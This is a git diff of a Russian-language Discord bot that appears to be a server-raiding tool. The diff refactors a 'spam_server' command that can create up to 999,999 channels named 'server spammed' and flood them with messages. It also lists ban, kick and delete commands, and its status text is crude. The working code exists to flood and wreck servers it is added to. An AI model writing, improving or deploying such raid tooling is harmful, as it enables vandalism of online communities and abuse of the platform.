@@ -1,7 +1,6 @@
 import discord
 from discord.ext import commands
 from config import settings
-import asyncio
 
 intents = discord.Intents.all()
 intents.members = True
@@ -11,7 +10,7 @@ bot.remove_command('help')
 
 @bot.event
 async def on_ready():
-    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="гей порно"))
+    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="смерти"))
     print("Готов всех джага-джага")
 
 
@@ -20,9 +19,10 @@ async def help(ctx):
     PREFIX = 's!'
     emb1 = discord.Embed(color = discord.Colour.from_rgb(102, 0, 204), title ="Информация о командах" )
 
-    emb1.add_field(name = f"{PREFIX}delete 0: ", value="Удалить ", inline=False)
-    emb1.add_field(name = f"{PREFIX}delete : ", value="Удалить ", inline=False)
-    emb1.add_field(name = f"{PREFIX}spam_server : ", value="Заспамить сервер", inline=True)
+    emb1.add_field(name = f"`{PREFIX}ban` : ", value="Банить", inline=False)
+    emb1.add_field(name = f"`{PREFIX}kick` : ", value="Кикать", inline=False)
+    emb1.add_field(name = f"`{PREFIX}delete` : ", value="Удалять", inline=False)
+    emb1.add_field(name = f"`{PREFIX}spam_server` : ", value="Спамить", inline=False)
 
     message = await ctx.send(embed = emb1)
                     
@@ -78,19 +78,18 @@ async def spam_server(ctx, n):
         spam_text += spam_line + "\n"
     
     if n == '0':
-        for line in range(0 , 999999):
-            guild = ctx.message.guild
-            await guild.create_text_channel('сервер-заспамлен')
-            await ctx.channel.send(spam_text)
+        amount = 999999
     else:        
-        for line in range(0 , int(n)):
-            guild = ctx.message.guild
-            await guild.create_text_channel('сервер-заспамлен')
-            await ctx.channel.send(spam_text)
+        amount = int(n)
+
+    for line in range(0 , amount):
+        guild = ctx.message.guild
+        await guild.create_text_channel('сервер-заспамлен')
+        await ctx.channel.send(spam_text)
 
 
 @bot.command()
-async def stop(ctx):
+async def xstop(ctx):
     await bot.change_presence(status=discord.Status.offline)
     raise SystemExit
 
